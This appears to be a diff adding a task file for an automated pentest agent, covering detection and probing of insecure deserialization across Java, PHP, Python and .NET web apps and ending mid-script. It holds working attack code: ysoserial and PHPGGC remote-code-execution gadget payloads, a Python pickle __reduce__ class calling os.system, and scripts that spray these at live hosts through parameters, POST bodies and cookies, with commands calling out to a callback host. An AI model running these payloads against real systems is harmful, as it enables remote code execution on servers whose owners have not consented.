@@ -1,0 +1,1051 @@
+================================================================================
+TASK 76 · DESERIALIZATION VULNERABILITY DETECTION
+================================================================================
+Covers testing_toolkit.txt Phase 9 Step 32 (Part 1)
+Detecting insecure deserialization across Java, PHP, Python, .NET, Ruby.
+
+OBJECTIVE:
+- Identify serialized data in requests/responses
+- Detect deserialization endpoints
+- Fingerprint serialization formats
+- Test for basic deserialization vulnerabilities
+- Build queue for exploitation in Task 77
+
+================================================================================
+INPUTS
+================================================================================
+outputs/url_corpus_all_in_scope.txt        ← URL corpus
+outputs/live_base_urls.txt                 ← Live hosts
+outputs/har/common_data.txt                ← Endpoints from HAR
+outputs/nuclei/tech_stack.json             ← Tech detection (Java, PHP, etc.)
+outputs/har/accounts/*_auth.json           ← Auth tokens/cookies
+
+================================================================================
+OUTPUTS
+================================================================================
+outputs/deser/
+├── serialized_data_found.txt       ← Endpoints with serialized data
+├── java_deser_candidates.txt       ← Java deserialization targets
+├── php_deser_candidates.txt        ← PHP deserialization targets
+├── python_deser_candidates.txt     ← Python pickle targets
+├── dotnet_deser_candidates.txt     ← .NET deserialization targets
+├── ruby_deser_candidates.txt       ← Ruby Marshal targets
+├── viewstate_targets.txt           ← ASP.NET ViewState targets
+├── deser_confirmed.txt             ← Confirmed vulnerable endpoints
+└── detection_log.txt               ← Full scan log
+
+temp/agent1/queue_deser_exploitation.txt ← Queue for Task 77
+
+================================================================================
+🧠 AGENT DECISION FRAMEWORK 🧠
+================================================================================
+
+STOP AND THINK: Deserialization detection requires TECHNOLOGY-AWARE approach.
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ DECISION TREE: What Backend Technology?                                     │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│  Check outputs/nuclei/tech_stack.json first!                               │
+│                                                                             │
+│  Technology Detected?                                                       │
+│  │                                                                          │
+│  ├─ Java (Tomcat, JBoss, WebLogic, Spring)?                                │
+│  │   └─ Focus on: rO0AB, javax.faces.ViewState, JSESSIONID                 │
+│  │   └─ Gadgets: Commons Collections, Spring, Hibernate                    │
+│  │                                                                          │
+│  ├─ PHP (Laravel, Symfony, WordPress, Drupal)?                             │
+│  │   └─ Focus on: O:N:"...", a:N:{...} patterns                            │
+│  │   └─ Also check: phar:// wrapper (indirect deser)                       │
+│  │                                                                          │
+│  ├─ Python (Django, Flask)?                                                │
+│  │   └─ Focus on: gASV... (base64 pickle), Flask session cookies           │
+│  │   └─ Flask sessions with SECRET_KEY = automatic RCE!                    │
+│  │                                                                          │
+│  ├─ .NET (ASP.NET, IIS)?                                                   │
+│  │   └─ Focus on: __VIEWSTATE, __EVENTVALIDATION                           │
+│  │   └─ Check: Is ViewState encrypted? Is MAC enabled?                     │
+│  │                                                                          │
+│  ├─ Node.js (Express)?                                                     │
+│  │   └─ Focus on: node-serialize (_$$ND_FUNC$$_)                           │
+│  │                                                                          │
+│  └─ Unknown?                                                                │
+│      └─ Run ALL detection patterns                                         │
+│      └─ Technology fingerprinting via error messages                       │
+│                                                                             │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+───────────────────────────────────────
+🔍 WHERE TO LOOK FOR SERIALIZED DATA
+───────────────────────────────────────
+Priority locations (HIGH → LOW):
+
+1. COOKIES (Highest priority)
+   - Session cookies often contain serialized data
+   - Look for: Base64-encoded large cookies
+
+2. HIDDEN FORM FIELDS
+   - ViewState, CSRF tokens with state
+   - Any field with base64 data
+
+3. URL PARAMETERS
+   - state=, data=, object=, session=
+   - Parameters accepting complex data
+
+4. REQUEST BODY
+   - POST data with binary/base64 content
+   - JSON with type hints ($type, @class)
+
+5. HEADERS
+   - Custom headers accepting serialized data
+   - X-Session, X-State, etc.
+
+───────────────────────────────────────
+🎯 DETECTION CONFIDENCE LEVELS
+───────────────────────────────────────
+HIGH CONFIDENCE (Proceed to Task 77 immediately):
+- Clear magic bytes: rO0AB, aced0005, gASV
+- PHP object: O:N:"ClassName":M:{...}
+- Unprotected ViewState
+- Error messages mentioning deserialize/unserialize
+
+MEDIUM CONFIDENCE (Needs verification):
+- Base64 in cookies without clear signature
+- JSON with suspicious type fields
+- Hidden form fields with large values
+
+LOW CONFIDENCE (Investigate further):
+- Parameters accepting any user input
+- No clear serialization but Java/PHP stack
+
+================================================================================
+🧠 DESERIALIZATION FUNDAMENTALS 🧠
+================================================================================
+
+───────────────────────────────────────
+What is Insecure Deserialization?
+───────────────────────────────────────
+Serialization: Converting object → byte stream (for storage/transmission)
+Deserialization: Converting byte stream → object
+
+VULNERABILITY: When untrusted data is deserialized, attacker-controlled
+objects can execute code during the deserialization process.
+
+Impact: Remote Code Execution (RCE), DoS, Authentication Bypass
+
+───────────────────────────────────────
+Serialization Formats by Language
+───────────────────────────────────────
+┌─────────────────────────────────────────────────────────────────────────────┐
+│ Language │ Format            │ Magic Bytes / Signature                     │
+├──────────┼───────────────────┼─────────────────────────────────────────────┤
+│ Java     │ ObjectInputStream │ AC ED 00 05 (rO0AB in base64)               │
+│ Java     │ XMLDecoder        │ <java> ... </java>                          │
+│ PHP      │ serialize()       │ O:4:"User":2:{...} (O: = Object)            │
+│ Python   │ pickle            │ \x80\x04\x95 (protocol 4), cos\n (protocol 0)│
+│ .NET     │ BinaryFormatter   │ 00 01 00 00 00 FF FF FF FF                  │
+│ .NET     │ ViewState         │ Base64 starting with /wE                    │
+│ Ruby     │ Marshal           │ \x04\x08 (marshal version)                  │
+│ Node.js  │ node-serialize    │ {"rce":"_$$ND_FUNC$$_function()..."}        │
+└─────────────────────────────────────────────────────────────────────────────┘
+
+================================================================================
+PHASE 1: DETECT SERIALIZED DATA
+================================================================================
+
+───────────────────────────────────────
+1.1 Search for Java Serialization
+───────────────────────────────────────
+mkdir -p outputs/deser temp/agent1/deser
+
+# Java serialized objects start with "rO0AB" in base64
+# Or hex: AC ED 00 05
+
+echo "[*] Searching for Java serialized data..."
+
+# Search in URL corpus for base64 patterns
+grep -oE "rO0AB[A-Za-z0-9+/=]+" outputs/url_corpus_all_in_scope.txt \
+    > temp/agent1/deser/java_serial_in_urls.txt
+
+# Search HAR data
+grep -oE "rO0AB[A-Za-z0-9+/=]+" outputs/har/common_data.txt \
+    >> temp/agent1/deser/java_serial_in_urls.txt 2>/dev/null
+
+# Common parameter names that might contain serialized data
+JAVA_PARAMS=(
+    "viewstate"
+    "javax.faces.ViewState"
+    "__VIEWSTATE"
+    "JSESSIONID"
+    "userSession"
+    "object"
+    "data"
+    "payload"
+    "token"
+    "state"
+)
+
+───────────────────────────────────────
+1.2 Search for PHP Serialization
+───────────────────────────────────────
+# PHP serialized: O:4:"User":1:{s:4:"name";s:5:"admin";}
+# Pattern: O:[0-9]+:"[^"]+":
+
+echo "[*] Searching for PHP serialized data..."
+
+# Look for PHP object patterns
+grep -oE 'O:[0-9]+:"[^"]+":[0-9]+:\{' outputs/url_corpus_all_in_scope.txt \
+    > temp/agent1/deser/php_serial_found.txt
+
+grep -oE 'a:[0-9]+:\{' outputs/url_corpus_all_in_scope.txt \
+    >> temp/agent1/deser/php_serial_found.txt
+
+# URL-encoded PHP serialization
+grep -oE 'O%3A[0-9]+%3A' outputs/url_corpus_all_in_scope.txt \
+    >> temp/agent1/deser/php_serial_found.txt
+
+───────────────────────────────────────
+1.3 Search for Python Pickle
+───────────────────────────────────────
+# Python pickle has various protocol versions
+# Base64 encoded pickle often starts with gASV (protocol 4)
+
+echo "[*] Searching for Python pickle data..."
+
+# Common pickle base64 prefixes
+grep -oE "gASV[A-Za-z0-9+/=]+" outputs/url_corpus_all_in_scope.txt \
+    > temp/agent1/deser/python_pickle_found.txt
+
+grep -oE "Y29z[A-Za-z0-9+/=]+" outputs/url_corpus_all_in_scope.txt \
+    >> temp/agent1/deser/python_pickle_found.txt
+
+───────────────────────────────────────
+1.4 Search for .NET ViewState
+───────────────────────────────────────
+# ASP.NET ViewState: base64 starting with /wE
+
+echo "[*] Searching for .NET ViewState..."
+
+grep -oE '/wE[A-Za-z0-9+/=]+' outputs/url_corpus_all_in_scope.txt \
+    > temp/agent1/deser/viewstate_found.txt
+
+# Also search for __VIEWSTATE parameter
+grep -iE "__VIEWSTATE|__EVENTVALIDATION" outputs/url_corpus_all_in_scope.txt \
+    >> temp/agent1/deser/viewstate_found.txt
+
+───────────────────────────────────────
+1.5 Comprehensive Format Detection Script
+───────────────────────────────────────
+#!/usr/bin/env python3
+# detect_serialization.py
+
+import re
+import base64
+import sys
+from urllib.parse import unquote
+
+class SerializationDetector:
+    def __init__(self):
+        self.results = {
+            'java': [],
+            'php': [],
+            'python': [],
+            'dotnet': [],
+            'ruby': [],
+            'nodejs': []
+        }
+    
+    def detect_java(self, data):
+        """Detect Java serialized objects"""
+        # Base64: rO0AB
+        if 'rO0AB' in data:
+            return True
+        
+        # Try to decode and check magic bytes
+        try:
+            decoded = base64.b64decode(data)
+            if decoded[:4] == b'\xac\xed\x00\x05':
+                return True
+        except:
+            pass
+        
+        # Hex format
+        if data.startswith('aced0005'):
+            return True
+        
+        return False
+    
+    def detect_php(self, data):
+        """Detect PHP serialized data"""
+        # Object: O:4:"name":
+        if re.search(r'O:\d+:"[^"]+":|\ba:\d+:\{', data):
+            return True
+        
+        # URL-decoded
+        decoded = unquote(data)
+        if re.search(r'O:\d+:"[^"]+":|\ba:\d+:\{', decoded):
+            return True
+        
+        return False
+    
+    def detect_python_pickle(self, data):
+        """Detect Python pickle"""
+        try:
+            decoded = base64.b64decode(data)
+            # Protocol 0: starts with ( or c
+            # Protocol 2-4: \x80\x02, \x80\x03, \x80\x04
+            if decoded[:1] in [b'\x80', b'(', b'c']:
+                return True
+            if decoded[:4] == b'\x80\x04\x95':  # Protocol 4
+                return True
+        except:
+            pass
+        
+        # Check for cos\n (common in pickle exploits)
+        if 'cos\n' in data or 'cposix\n' in data:
+            return True
+        
+        return False
+    
+    def detect_dotnet(self, data):
+        """Detect .NET serialized data"""
+        # BinaryFormatter magic
+        try:
+            decoded = base64.b64decode(data)
+            if decoded[:8] == b'\x00\x01\x00\x00\x00\xff\xff\xff':
+                return True
+        except:
+            pass
+        
+        # ViewState (starts with /wE)
+        if data.startswith('/wE') or '__VIEWSTATE' in data:
+            return True
+        
+        return False
+    
+    def detect_ruby_marshal(self, data):
+        """Detect Ruby Marshal format"""
+        try:
+            decoded = base64.b64decode(data)
+            if decoded[:2] == b'\x04\x08':
+                return True
+        except:
+            pass
+        return False
+    
+    def detect_nodejs(self, data):
+        """Detect Node.js node-serialize"""
+        if '_$$ND_FUNC$$_' in data:
+            return True
+        return False
+    
+    def analyze(self, data, source='unknown'):
+        """Analyze data for all serialization formats"""
+        results = []
+        
+        if self.detect_java(data):
+            results.append(('java', data[:50], source))
+            self.results['java'].append((data, source))
+        
+        if self.detect_php(data):
+            results.append(('php', data[:50], source))
+            self.results['php'].append((data, source))
+        
+        if self.detect_python_pickle(data):
+            results.append(('python', data[:50], source))
+            self.results['python'].append((data, source))
+        
+        if self.detect_dotnet(data):
+            results.append(('dotnet', data[:50], source))
+            self.results['dotnet'].append((data, source))
+        
+        if self.detect_ruby_marshal(data):
+            results.append(('ruby', data[:50], source))
+            self.results['ruby'].append((data, source))
+        
+        if self.detect_nodejs(data):
+            results.append(('nodejs', data[:50], source))
+            self.results['nodejs'].append((data, source))
+        
+        return results
+
+# Main
+detector = SerializationDetector()
+
+# Read URLs and analyze
+with open('outputs/url_corpus_all_in_scope.txt') as f:
+    for line in f:
+        url = line.strip()
+        # Extract parameters
+        if '=' in url:
+            for param in url.split('&'):
+                if '=' in param:
+                    value = param.split('=', 1)[1]
+                    results = detector.analyze(value, url)
+                    for fmt, sample, src in results:
+                        print(f"[+] {fmt}: {sample}... in {src[:80]}")
+
+# Save results
+for fmt, items in detector.results.items():
+    if items:
+        with open(f'outputs/deser/{fmt}_deser_candidates.txt', 'w') as f:
+            for data, source in items:
+                f.write(f"{source}|{data[:100]}\n")
+        print(f"[*] Saved {len(items)} {fmt} candidates")
+
+================================================================================
+PHASE 2: PROBE FOR DESERIALIZATION ENDPOINTS
+================================================================================
+
+───────────────────────────────────────
+2.1 Active Probing with Serialized Payloads
+───────────────────────────────────────
+#!/bin/bash
+# probe_deser.sh
+
+echo "[*] Probing for deserialization endpoints..."
+
+# Check tech stack to determine which formats to test
+TECH_STACK=$(cat outputs/nuclei/tech_stack.json 2>/dev/null)
+
+# Java endpoints to probe
+JAVA_PATHS=(
+    "/invoke"
+    "/invoker/JMXInvokerServlet"
+    "/invoker/EJBInvokerServlet"
+    "/jmx-console"
+    "/web-console"
+    "/console"
+    "/admin-console"
+    "/jndi"
+    "/axis2"
+    "/axis"
+    "/faces"
+)
+
+# Test each live host
+while IFS= read -r base_url; do
+    echo "[*] Probing: $base_url"
+    
+    for path in "${JAVA_PATHS[@]}"; do
+        url="${base_url}${path}"
+        status=$(curl -sk -o /dev/null -w "%{http_code}" "$url" --max-time 5)
+        
+        if [ "$status" != "404" ] && [ "$status" != "000" ]; then
+            echo "[+] Potential Java deser endpoint: $url ($status)"
+            echo "$url|$status|java_endpoint" >> outputs/deser/java_deser_candidates.txt
+        fi
+    done
+done < temp/agent1/live_base_urls.txt
+
+───────────────────────────────────────
+2.2 Detect Java Deserialization via Error
+───────────────────────────────────────
+#!/bin/bash
+# java_deser_error_detect.sh
+
+# Invalid serialized data should trigger specific errors
+INVALID_JAVA_SERIAL="rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpqYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhX"
+
+# Errors indicating Java deserialization
+JAVA_DESER_ERRORS=(
+    "java.io.InvalidClassException"
+    "java.io.StreamCorruptedException"
+    "java.io.ObjectInputStream"
+    "java.lang.ClassNotFoundException"
+    "java.io.IOException"
+    "InvalidClassException"
+    "StreamCorruptedException"
+    "ClassCastException"
+    "unable to deserialize"
+    "Deserialization failed"
+)
+
+while IFS= read -r url; do
+    [ -z "$url" ] && continue
+    
+    # Send invalid serialized data
+    response=$(curl -sk "$url" \
+        -H "Content-Type: application/x-java-serialized-object" \
+        -d "$INVALID_JAVA_SERIAL" \
+        --max-time 10 2>/dev/null)
+    
+    for error in "${JAVA_DESER_ERRORS[@]}"; do
+        if echo "$response" | grep -qi "$error"; then
+            echo "[+] Java deser endpoint confirmed: $url"
+            echo "[+] Error: $error"
+            echo "$url|java|$error" >> outputs/deser/deser_confirmed.txt
+            break
+        fi
+    done
+    
+done < outputs/deser/java_deser_candidates.txt
+
+───────────────────────────────────────
+2.3 Detect PHP Deserialization via Error
+───────────────────────────────────────
+#!/bin/bash
+# php_deser_detect.sh
+
+# Invalid PHP serialized object
+INVALID_PHP='O:9999:"invalid":0:{}'
+
+# PHP deserialization errors
+PHP_DESER_ERRORS=(
+    "unserialize()"
+    "__wakeup"
+    "__destruct"
+    "Incomplete"
+    "Invalid serialization data"
+    "Cannot unserialize"
+)
+
+# Test parameters that might accept serialized data
+PHP_PARAMS=(
+    "data"
+    "object"
+    "token"
+    "session"
+    "cookie"
+    "state"
+    "payload"
+    "user"
+    "auth"
+)
+
+while IFS= read -r base_url; do
+    for param in "${PHP_PARAMS[@]}"; do
+        url="${base_url}?${param}=${INVALID_PHP}"
+        
+        response=$(curl -sk "$url" --max-time 10 2>/dev/null)
+        
+        for error in "${PHP_DESER_ERRORS[@]}"; do
+            if echo "$response" | grep -qi "$error"; then
+                echo "[+] PHP deser candidate: $base_url ($param)"
+                echo "$base_url|$param|php" >> outputs/deser/php_deser_candidates.txt
+                break 2
+            fi
+        done
+    done
+done < temp/agent1/live_base_urls.txt
+
+───────────────────────────────────────
+2.4 Detect ASP.NET ViewState
+───────────────────────────────────────
+#!/bin/bash
+# detect_viewstate.sh
+
+echo "[*] Searching for ASP.NET ViewState..."
+
+while IFS= read -r url; do
+    response=$(curl -sk "$url" --max-time 10 2>/dev/null)
+    
+    # Check for ViewState hidden field
+    viewstate=$(echo "$response" | grep -oP '__VIEWSTATE.*?value="[^"]+"' | head -1)
+    
+    if [ -n "$viewstate" ]; then
+        echo "[+] ViewState found: $url"
+        echo "$url|$viewstate" >> outputs/deser/viewstate_targets.txt
+        
+        # Check if MAC validation is disabled
+        if echo "$viewstate" | grep -q "/wEPDw"; then
+            echo "    [!] Potentially unprotected ViewState"
+        fi
+    fi
+    
+    # Check for __EVENTVALIDATION
+    eventval=$(echo "$response" | grep -oP '__EVENTVALIDATION.*?value="[^"]+"')
+    if [ -n "$eventval" ]; then
+        echo "[+] EventValidation found: $url"
+    fi
+    
+done < temp/agent1/live_base_urls.txt
+
+================================================================================
+PHASE 3: YSOSERIAL DNS CALLBACK TEST
+================================================================================
+
+───────────────────────────────────────
+3.1 Install ysoserial
+───────────────────────────────────────
+# Download ysoserial
+wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar \
+    -O temp/agent1/ysoserial.jar
+
+# Verify
+java -jar temp/agent1/ysoserial.jar --help
+
+# List available gadget chains
+java -jar temp/agent1/ysoserial.jar 2>&1 | grep -E "^\s+\w+"
+
+───────────────────────────────────────
+3.2 Generate DNS Callback Payload
+───────────────────────────────────────
+#!/bin/bash
+# ysoserial_dns_test.sh
+
+CALLBACK=$(cat outputs/interactsh_id.txt 2>/dev/null || echo "CALLBACK.oast.fun")
+YSOSERIAL="temp/agent1/ysoserial.jar"
+
+# Gadget chains to test (most common)
+GADGETS=(
+    "URLDNS"           # Always works if Java deser exists
+    "CommonsCollections1"
+    "CommonsCollections2"
+    "CommonsCollections3"
+    "CommonsCollections4"
+    "CommonsCollections5"
+    "CommonsCollections6"
+    "CommonsCollections7"
+    "Jdk7u21"
+    "BeanShell1"
+    "Spring1"
+    "Spring2"
+)
+
+# Generate URLDNS payload (for detection, doesn't require gadget libs)
+java -jar "$YSOSERIAL" URLDNS "https://${CALLBACK}/urldns-test" \
+    > temp/agent1/deser/urldns_payload.bin
+
+# Base64 encode for HTTP transmission
+base64 -w0 temp/agent1/deser/urldns_payload.bin \
+    > temp/agent1/deser/urldns_payload_b64.txt
+
+echo "[*] URLDNS payload generated"
+echo "[*] Callback domain: $CALLBACK"
+
+───────────────────────────────────────
+3.3 Test URLDNS on Candidates
+───────────────────────────────────────
+#!/bin/bash
+# test_urldns.sh
+
+CALLBACK=$(cat outputs/interactsh_id.txt 2>/dev/null || echo "CALLBACK.oast.fun")
+PAYLOAD=$(cat temp/agent1/deser/urldns_payload_b64.txt)
+
+echo "[*] Testing Java deserialization with URLDNS..."
+
+while IFS='|' read -r url status type; do
+    [ -z "$url" ] && continue
+    
+    # Generate unique subdomain for this target
+    unique_id=$(echo "$url" | md5sum | cut -c1-8)
+    
+    # Regenerate payload with unique callback
+    java -jar temp/agent1/ysoserial.jar URLDNS \
+        "https://${unique_id}.${CALLBACK}/urldns" 2>/dev/null | \
+        base64 -w0 > temp/agent1/deser/payload_${unique_id}.txt
+    
+    payload=$(cat temp/agent1/deser/payload_${unique_id}.txt)
+    
+    echo "[*] Testing: $url (callback: ${unique_id}.${CALLBACK})"
+    
+    # Test via POST body
+    curl -sk "$url" \
+        -H "Content-Type: application/x-java-serialized-object" \
+        --data-binary "@temp/agent1/deser/urldns_payload.bin" \
+        --max-time 10 &>/dev/null
+    
+    # Test via Cookie
+    curl -sk "$url" \
+        -H "Cookie: data=$payload" \
+        --max-time 10 &>/dev/null
+    
+    # Test via parameter
+    curl -sk "${url}?data=${payload}" \
+        --max-time 10 &>/dev/null
+    
+    echo "$url|$unique_id|urldns" >> temp/agent1/deser/urldns_tests.txt
+    
+done < outputs/deser/java_deser_candidates.txt
+
+echo "[*] Check interactsh for DNS callbacks"
+echo "[*] Callback format: <unique_id>.${CALLBACK}"
+
+================================================================================
+PHASE 4: PHPGGC DETECTION TEST
+================================================================================
+
+───────────────────────────────────────
+4.1 Install PHPGGC
+───────────────────────────────────────
+git clone https://github.com/ambionics/phpggc.git temp/agent1/phpggc
+cd temp/agent1/phpggc
+
+# List available chains
+./phpggc -l
+
+# Common chains
+./phpggc -l | grep -iE "rce|file|write"
+
+───────────────────────────────────────
+4.2 Generate PHP Detection Payloads
+───────────────────────────────────────
+#!/bin/bash
+# phpggc_generate.sh
+
+PHPGGC="temp/agent1/phpggc/phpggc"
+CALLBACK=$(cat outputs/interactsh_id.txt 2>/dev/null || echo "CALLBACK.oast.fun")
+
+mkdir -p temp/agent1/deser/php_payloads
+
+# Guzzle RCE (common)
+$PHPGGC Guzzle/RCE1 system "curl https://${CALLBACK}/phpggc-guzzle" \
+    > temp/agent1/deser/php_payloads/guzzle_rce.txt
+
+# Laravel RCE
+$PHPGGC Laravel/RCE1 system "curl https://${CALLBACK}/phpggc-laravel" \
+    > temp/agent1/deser/php_payloads/laravel_rce.txt
+
+# Symfony RCE
+$PHPGGC Symfony/RCE4 exec "curl https://${CALLBACK}/phpggc-symfony" \
+    > temp/agent1/deser/php_payloads/symfony_rce.txt
+
+# Monolog RCE
+$PHPGGC Monolog/RCE1 system "curl https://${CALLBACK}/phpggc-monolog" \
+    > temp/agent1/deser/php_payloads/monolog_rce.txt
+
+# WordPress (PHPMailer)
+$PHPGGC PHPMailer/RCE1 "curl https://${CALLBACK}/phpggc-phpmailer" \
+    > temp/agent1/deser/php_payloads/phpmailer_rce.txt 2>/dev/null
+
+# Yii RCE
+$PHPGGC Yii/RCE1 "curl https://${CALLBACK}/phpggc-yii" \
+    > temp/agent1/deser/php_payloads/yii_rce.txt 2>/dev/null
+
+echo "[*] PHP gadget payloads generated in temp/agent1/deser/php_payloads/"
+
+───────────────────────────────────────
+4.3 Test PHP Deserialization
+───────────────────────────────────────
+#!/bin/bash
+# test_php_deser.sh
+
+echo "[*] Testing PHP deserialization..."
+
+while IFS='|' read -r url param type; do
+    [ -z "$url" ] && continue
+    
+    echo "[*] Testing: $url ($param)"
+    
+    for payload_file in temp/agent1/deser/php_payloads/*.txt; do
+        payload=$(cat "$payload_file")
+        payload_name=$(basename "$payload_file" .txt)
+        
+        # URL encode the payload
+        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
+        
+        # Test via GET parameter
+        curl -sk "${url}?${param}=${encoded}" --max-time 10 &>/dev/null
+        
+        # Test via POST
+        curl -sk "$url" -d "${param}=${encoded}" --max-time 10 &>/dev/null
+        
+        # Test via Cookie
+        curl -sk "$url" -H "Cookie: ${param}=${encoded}" --max-time 10 &>/dev/null
+        
+    done
+    
+done < outputs/deser/php_deser_candidates.txt
+
+echo "[*] Check interactsh for PHP gadget callbacks"
+
+================================================================================
+PHASE 5: PYTHON PICKLE DETECTION
+================================================================================
+
+───────────────────────────────────────
+5.1 Fickling - Pickle Analysis
+───────────────────────────────────────
+# Install fickling
+pip install fickling
+
+# Analyze pickle data
+fickling --help
+
+───────────────────────────────────────
+5.2 Generate Pickle Detection Payloads
+───────────────────────────────────────
+#!/usr/bin/env python3
+# generate_pickle_payloads.py
+
+import pickle
+import base64
+import os
+
+class PickleRCE:
+    def __init__(self, cmd):
+        self.cmd = cmd
+    
+    def __reduce__(self):
+        import os
+        return (os.system, (self.cmd,))
+
+# Read callback domain
+callback = open('outputs/interactsh_id.txt').read().strip() if os.path.exists('outputs/interactsh_id.txt') else 'CALLBACK.oast.fun'
+
+os.makedirs('temp/agent1/deser/pickle_payloads', exist_ok=True)
+
+# Generate detection payload (DNS/HTTP callback)
+payloads = [
+    ('curl_callback', f'curl https://{callback}/pickle-rce'),
+    ('wget_callback', f'wget https://{callback}/pickle-wget'),
+    ('nslookup', f'nslookup pickle.{callback}'),
+    ('id_command', 'id > /tmp/pickle_pwned'),
+]
+
+for name, cmd in payloads:
+    obj = PickleRCE(cmd)
+    
+    # Protocol 0 (ASCII, most compatible)
+    payload_0 = pickle.dumps(obj, protocol=0)
+    with open(f'temp/agent1/deser/pickle_payloads/{name}_p0.bin', 'wb') as f:
+        f.write(payload_0)
+    
+    # Protocol 2
+    payload_2 = pickle.dumps(obj, protocol=2)
+    with open(f'temp/agent1/deser/pickle_payloads/{name}_p2.bin', 'wb') as f:
+        f.write(payload_2)
+    
+    # Base64 encoded (for HTTP params)
+    b64 = base64.b64encode(payload_2).decode()
+    with open(f'temp/agent1/deser/pickle_payloads/{name}_b64.txt', 'w') as f:
+        f.write(b64)
+    
+    print(f'[+] Generated: {name}')
+
+print(f'[*] Callback domain: {callback}')
+
+───────────────────────────────────────
+5.3 Test Python Pickle Deserialization
+───────────────────────────────────────
+#!/bin/bash
+# test_pickle.sh
+
+echo "[*] Testing Python pickle deserialization..."
+
+# Python frameworks often use pickle in:
+# - Session cookies (Flask)
+# - Cache backends
+# - Celery task serialization
+# - Django cached sessions
+
+PICKLE_PARAMS=(
+    "session"
+    "data"
+    "pickle"
+    "object"
+    "cache"
+    "state"
+)
+
+while IFS= read -r base_url; do
+    echo "[*] Testing: $base_url"
+    
+    for param in "${PICKLE_PARAMS[@]}"; do
+        for payload_file in temp/agent1/deser/pickle_payloads/*_b64.txt; do
+            payload=$(cat "$payload_file")
+            
+            # Test via GET
+            curl -sk "${base_url}?${param}=${payload}" --max-time 10 &>/dev/null
+            
+            # Test via Cookie
+            curl -sk "$base_url" -H "Cookie: ${param}=${payload}" --max-time 10 &>/dev/null
+            
+            # Test via POST
+            curl -sk "$base_url" -d "${param}=${payload}" --max-time 10 &>/dev/null
+        done
+    done
+    
+done < temp/agent1/live_base_urls.txt
+
+echo "[*] Check interactsh for pickle callbacks"
+
+================================================================================
+PHASE 6: .NET DESERIALIZATION DETECTION
+================================================================================
+
+───────────────────────────────────────
+6.1 ViewState Analyzer
+───────────────────────────────────────
+#!/usr/bin/env python3
+# viewstate_analyzer.py
+
+import base64
+import re
+import sys
+
+def analyze_viewstate(viewstate_b64):
+    """Analyze ASP.NET ViewState for vulnerabilities"""
+    
+    try:
+        decoded = base64.b64decode(viewstate_b64)
+    except:
+        return None
+    
+    results = {
+        'encrypted': False,
+        'mac_enabled': False,
+        'version': None,
+        'vulnerable': False
+    }
+    
+    # Check first bytes
+    if decoded[:2] == b'/w':
+        results['version'] = '2.0'
+    elif decoded[:2] == b'\xff\x01':
+        results['version'] = '1.0'
+        results['vulnerable'] = True  # Older versions more likely vulnerable
+    
+    # Check for MAC
+    # MAC-protected ViewState is longer and has specific structure
+    if len(decoded) > 20:
+        # Last 20 bytes might be HMAC-SHA1
+        results['mac_enabled'] = True
+    
+    # Check for encryption markers
+    if decoded[:4] == b'\x00\x01\x00\x00':
+        results['encrypted'] = True
+    
+    return results
+
+# Analyze ViewState targets
+with open('outputs/deser/viewstate_targets.txt') as f:
+    for line in f:
+        url, viewstate = line.strip().split('|', 1)
+        
+        # Extract actual ViewState value
+        match = re.search(r'value="([^"]+)"', viewstate)
+        if match:
+            vs_value = match.group(1)
+            result = analyze_viewstate(vs_value)
+            
+            if result:
+                print(f"[*] {url}")
+                print(f"    Version: {result['version']}")
+                print(f"    MAC: {'Yes' if result['mac_enabled'] else 'No (!)'}")
+                print(f"    Encrypted: {'Yes' if result['encrypted'] else 'No'}")
+                
+                if not result['mac_enabled']:
+                    print(f"    [!] POTENTIALLY VULNERABLE - No MAC protection")
+                    with open('outputs/deser/dotnet_deser_candidates.txt', 'a') as out:
+                        out.write(f"{url}|viewstate|no_mac\n")
+
+───────────────────────────────────────
+6.2 ysoserial.net Payload Generation
+───────────────────────────────────────
+# Download ysoserial.net (Windows)
+# https://github.com/pwntester/ysoserial.net/releases
+
+# Common .NET gadgets
+DOTNET_GADGETS=(
+    "ObjectDataProvider"
+    "TypeConfuseDelegate"
+    "TextFormattingRunProperties"
+    "WindowsIdentity"
+    "ActivitySurrogateSelector"
+)
+
+# Generate payload (requires Windows or Mono)
+# ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c nslookup callback.oast.fun"
+
+================================================================================
+PHASE 7: BUILD EXPLOITATION QUEUE
+================================================================================
+
+───────────────────────────────────────
+7.1 Consolidate Findings
+───────────────────────────────────────
+#!/bin/bash
+# build_deser_queue.sh
+
+echo "# Deserialization Exploitation Queue for Task 77" > outputs/queue_deser_exploitation.txt
+echo "# Format: url|type|gadget_hint|notes" >> outputs/queue_deser_exploitation.txt
+echo "" >> outputs/queue_deser_exploitation.txt
+
+# Add Java candidates
+if [ -f outputs/deser/java_deser_candidates.txt ]; then
+    echo "## Java Deserialization Targets" >> outputs/queue_deser_exploitation.txt
+    cat outputs/deser/java_deser_candidates.txt >> outputs/queue_deser_exploitation.txt
+    echo "" >> outputs/queue_deser_exploitation.txt
+fi
+
+# Add PHP candidates
+if [ -f outputs/deser/php_deser_candidates.txt ]; then
+    echo "## PHP Deserialization Targets" >> outputs/queue_deser_exploitation.txt
+    cat outputs/deser/php_deser_candidates.txt >> outputs/queue_deser_exploitation.txt
+    echo "" >> outputs/queue_deser_exploitation.txt
+fi
+
+# Add Python candidates
+if [ -f outputs/deser/python_deser_candidates.txt ]; then
+    echo "## Python Pickle Targets" >> outputs/queue_deser_exploitation.txt
+    cat outputs/deser/python_deser_candidates.txt >> outputs/queue_deser_exploitation.txt
+    echo "" >> outputs/queue_deser_exploitation.txt
+fi
+
+# Add .NET candidates
+if [ -f outputs/deser/dotnet_deser_candidates.txt ]; then
+    echo "## .NET ViewState/BinaryFormatter Targets" >> outputs/queue_deser_exploitation.txt
+    cat outputs/deser/dotnet_deser_candidates.txt >> outputs/queue_deser_exploitation.txt
